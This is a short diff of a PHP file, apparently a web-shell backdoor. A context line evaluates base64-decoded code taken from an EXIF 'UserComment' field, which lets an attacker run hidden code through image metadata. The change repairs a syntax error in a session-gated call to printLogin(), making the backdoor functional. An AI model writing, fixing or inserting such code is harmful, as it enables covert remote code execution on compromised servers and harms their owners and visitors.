@@ -5,6 +5,6 @@ eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
 }
 
 
-if(isset($_SESSION[md5($_SERVER['HTTP_HOST'])])
+if(isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 	printLogin();
 ?>
